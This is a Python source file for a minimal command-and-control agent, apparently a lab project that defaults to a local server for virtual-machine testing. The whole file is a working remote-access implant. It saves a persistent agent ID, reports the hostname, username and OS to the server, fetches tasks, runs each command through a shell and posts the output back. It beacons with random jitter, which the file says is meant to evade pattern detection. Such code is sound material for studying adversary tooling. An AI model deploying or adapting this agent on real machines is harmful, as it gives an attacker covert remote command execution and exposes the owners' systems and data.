import os 
import platform 
import subprocess
import uuid
import time
import requests
from pathlib import Path

SERVER = "http://127.0.0.1:8000"    # change for cross VM testing
BEACON_INTERVAL = 5                 # in seconds
JITTER = 0.3                        # 30% randomization(anti-pattern detection)
ID_FILE = Path.home() / ".mini_c2_id"

def get_agent_id() -> str: 
    if ID_FILE.exists():
        return ID_FILE.read_text().strip()

    new_id = str(uuid.uuid4())
    ID_FILE.write_text(new_id)

    return new_id

def collect_metadata() -> dict:
    return {
        "hostname": platform.node(),
        "username": os.getlogin(),
        "os": f"{platform.system()} {platform.release()}"
    }

def execute(command: str) -> str: 
    try: 
        result = subprocess.run(
            command, 
            shell=True,
            capture_output=True, 
            text=True, 
            timeout=30,  
        )
        return (result.stdout or "") + (result.stderr or "")
    except subprocess.TimeoutExpired:
        return "[!] Command timed out (30s)"
    except Exception as e: 
        return f"[!] Execution error: {e}"
    
def beacon(agent_id: str): 
    payload = {
        "agent_id": agent_id, 
        **collect_metadata()
    }
    
    try:
        r = requests.post(f"{SERVER}/checkin", json=payload, timeout=10)
        return r.json().get("tasks", [])
    except requests.RequestException: 
        return []

def submit_result(
        agent_id: str, 
        task_id: str,
        output: str 
): 
    try: 
        requests.post(f"{SERVER}/result", 
                      json={
                          "agent_id": agent_id,
                          "task_id": task_id, 
                          "output": output, 
                          }, timeout=10)
    except requests.RequestException:
        pass # retry next beacon

def main(): 
    import random 
    agent_id = get_agent_id()

    while True: 
        tasks = beacon(agent_id) 
        for task in tasks: 
            output = execute(task["command"])
            submit_result(agent_id, task["id"], output)
        
        sleep_time = BEACON_INTERVAL* (1 + random.uniform(-JITTER, JITTER))
        time.sleep(max(1, sleep_time))

if __name__ == "__main__": 
    main()